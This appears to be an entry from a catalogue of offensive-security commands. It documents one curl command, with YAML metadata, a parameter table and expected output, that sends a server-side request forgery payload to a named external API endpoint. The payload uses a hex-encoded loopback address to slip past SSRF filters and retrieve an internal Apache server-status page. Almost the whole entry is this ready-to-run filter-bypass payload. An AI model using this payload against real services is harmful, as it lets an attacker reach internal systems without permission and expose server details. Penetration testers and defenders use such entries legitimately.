---
data: >-
  curl -X POST -d 'url=http://0x7f000001:8081/server-status'
  https://www.apitest.io/request
tags:
  - ssrf
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.417Z'
id: c356504a-db6f-4433-a1a0-5013f52d7de8
verified: false
validated: true
submitted: true
---
# curl-ssrf-ip-bypass-hex

## Command

```bash
curl -X POST -d 'url=http://0x7f000001:8081/server-status' https://www.apitest.io/request
```

## Description

Bypasses SSRF mitigation with hexadecimal IP encoding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d 'url=...'` | Hex-encoded URL | Yes |
| `https://www.apitest.io/request` | Endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'url=http://0x7f000001:8081/server-status' https://www.apitest.io/request
```

## Expected Output

Apache server-status page content.

## Related

- [[Related Procedure]]
